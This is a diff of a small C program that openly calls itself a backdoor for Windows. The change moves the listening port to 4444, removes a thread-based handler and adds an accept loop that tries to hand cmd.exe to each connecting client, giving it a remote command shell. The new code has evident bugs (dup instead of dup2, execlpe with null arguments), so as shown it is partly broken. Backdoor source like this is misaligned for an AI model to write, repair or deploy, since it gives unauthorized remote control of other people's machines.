@@ -1,12 +1,7 @@
 /*
  ****************************************************************
  * A simple backdoor for Windoze...                             *
- **************************************************************************
- *  /////////////////\\\\\\\\\\\\\\\\\\\\              BY                 *
- * //////// My DAD and Step Mom  \\\\\\\\\            P.R.S.              *
- * \\\  .:[P R S T U V W X Y NOSEY]:.  ///   I'm 29 years old, and they   *
- *  \\\\\\\\\\\\\\\\\//////////////////// still wanna' pry (never stops). *
- **************************************************************************
+ ****************************************************************
  */
 
 #include <stdio.h>
@@ -18,13 +13,13 @@
 #include <windows.h>
 #include <winsock2.h>
 
-#define MY_PORT 8888
+#define MY_PORT 4444
 #define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"
 
 #define TERMINATE(A, T, M) ({\
 	if((T)) {\
-		if(A == 0) fprintf(stderr, "ERROR: %s\n", M);\
-		else if(A == 1) fprintf(stderr, "WARNING: %s\n", M);\
+		if(A == 0) fprintf(stderr, "[LINE:%d] [FILE:%s] : ERROR: %s\n", __LINE__, __FILE__, M);\
+		else if(A == 1) fprintf(stderr, "[LINE:%d] [FILE:%s] : WARNING: %s\n", __LINE__, __FILE__, M);\
 		else fprintf(stdout, "%s\n", M);\
 		errno = 0;\
 		goto error;\
@@ -47,33 +42,13 @@ size_t s;
 		*(p+i)=0;
 }
 
-struct _tagPROGRAM {
-	int serverfd;
-	int clientfd;
-} program;
-
-DWORD
-backdoor_thread(lpVoid)
-LPVOID lpVoid;
-{
-	struct _tagPROGRAM prog = *(struct _tagPROGRAM*)lpVoid;
-	const char *args[] = {"", NULL};
-	dup2(prog.clientfd, 0);
-	dup2(prog.clientfd, 1);
-	execvp(PROGRAM_NAME, args);
-	closesocket(prog.clientfd);
-	return S_OK;
-}
-
 int
 main()
 {
 	WSADATA wsaData;
 	int sockfd;
 	struct sockaddr_in self;
-	HANDLE hThread;
 
-	pzero(&program, sizeof(program));
 	WSAStartup(MAKEWORD(2, 0), &wsaData);
 	sockfd = 0;
     TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
@@ -88,7 +63,6 @@ main()
 	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
 	/* listen for connections */
 	TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));
-	program.serverfd = sockfd;
 
 	for(;;) {
 		int clientfd;
@@ -98,14 +72,27 @@ main()
 
 		/* accept connection */
 		clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
-		if(clientfd > 0) program.clientfd = clientfd;
-		pzero(message, sizeof(message));
-		sprintf(message, "%s: client connected.\n", inet_ntoa(client.sin_addr));
-		puts(message);
-		while((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&backdoor_thread, &program, 0, 0)));
+		if(clientfd>0) {
+			pzero(message, sizeof(message));
+			sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
+				client.sin_port);
+			puts(message);
+			dup(0);
+			dup(1);
+			dup(2);
+			execlpe(PROGRAM_NAME, NULL, NULL);
+			if(closesocket(clientfd)==0) {
+				pzero(message, sizeof(message));
+				sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
+					client.sin_port);
+				puts(message);
+				close(0);
+				close(1);
+				close(2);
+			}
+		}
 	}
 
-	while(WaitForSingleObject(hThread, 0));
 	closesocket(sockfd);
 	WSACleanup();
     return 0;
